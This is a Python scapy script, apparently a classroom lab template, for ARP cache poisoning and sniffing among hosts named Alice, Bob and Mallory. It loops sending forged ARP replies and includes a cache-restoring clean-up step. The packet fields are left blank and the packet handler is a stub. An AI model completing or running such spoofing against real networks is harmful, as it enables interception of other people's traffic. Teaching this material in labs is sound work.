from pprint import pprint
from scapy.all import ARP, send, AsyncSniffer, Packet, Raw
from scapy.layers.http import HTTPRequest
import time

ALICE_IP = '172.31.0.2'
ALICE_MAC = '02:42:ac:1f:00:02'
BOB_IP = '172.31.0.3'
BOB_MAC = '02:42:ac:1f:00:03'
MALLORY_IP = '172.31.0.4'
MALLORY_MAC = '02:42:ac:1f:00:04'

def process_packet(pkt: Packet):
    """ Process the packets """
    pass

def clean():
    print("\nStopping ARP poisoning, returning caches to normal state...")
    send(ARP(op='is-at', pdst='', psrc='',
         hwsrc=''), verbose=False)
    send(ARP(op='is-at', pdst='', psrc='',
         hwsrc=''), verbose=False)

def main() -> None:
    """ ARP Poisoning and sniffing """
    sniffer = AsyncSniffer(iface='eth0', prn=process_packet,
                         store=False)
    try:
        sniffer.start()
        print('Starting poisoning')
        while True:

            send(ARP(op='is-at', pdst='',
                 psrc='', hwsrc=''), verbose=False)
            send(ARP(op='is-at', pdst='',
                 psrc='', hwsrc=''), verbose=False)

            time.sleep(2)
    except KeyboardInterrupt:
        print('Keyboard interrupt')
        sniffer.stop()
    clean()

if __name__ == '__main__':
    main()